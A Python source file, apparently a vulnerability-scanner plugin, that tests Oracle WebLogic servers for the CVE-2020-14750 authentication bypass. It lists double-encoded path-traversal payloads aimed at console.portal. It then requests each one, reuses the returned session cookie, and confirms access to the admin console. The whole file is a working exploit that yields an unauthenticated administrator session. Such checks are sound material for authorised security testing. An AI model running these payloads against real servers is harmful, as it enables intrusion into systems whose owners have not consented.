#!/usr/bin/env python3
# -*- coding:utf-8 -*-

cve_2020_14750_payloads = [
    {'path': 'images/%252E./console.portal'},
    {'path': 'images/%252e%252e%252fconsole.portal'},
    {'path': 'css/%252E./console.portal'},
    {'path': 'css/%252e%252e%252fconsole.portal'},
    {'path': 'console/images/%252E./console.portal'},
    {'path': 'console/images/%252e%252e%252fconsole.portal'},
    {'path': 'console/css/%252E./console.portal'},
    {'path': 'console/css/%252e%252e%252fconsole.portal'},
]

def cve_2020_14750_scan(clients):
    ''' Weblogic 权限验证绕过漏洞
            可通过目录跳转符../回到上一级目录, 然后在../后面拼接console后台目录, 即可绕过后台登录, 直接进入后台
    '''
    client = clients.get('reqClient')

    vul_info = {
        'app_name': 'Weblogic',
        'vul_type': 'unAuthorized',
        'vul_id': 'CVE-2020-14750',
    }
    
    headers = {}

    for payload in cve_2020_14750_payloads:
        path = payload['path']

        res1 = client.request(
            'get',
            path,
            allow_redirects=False,
            vul_info=vul_info
        )
        if res1 is None:
            continue

        if ((res1.status_code == 302) and (res1.headers.get('Set-Cookie'))):
            cookie = {
                'Cookie': res1.headers.get('Set-Cookie', '')
            }
            headers.update(cookie)

            res2 = client.request(
                'get',
                path,
                headers=headers,
                vul_info=vul_info
            )
            if res2 is None:
                continue

            if (('管理控制台' in res2.text) 
                or ('Information and Resources' in res2.text) 
                or ('Overloaded' in res2.text)):
                results = {
                    'Target': res2.request.url,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Cookie': cookie['Cookie'],
                    'Request': res2,
                }
                return results
    return None
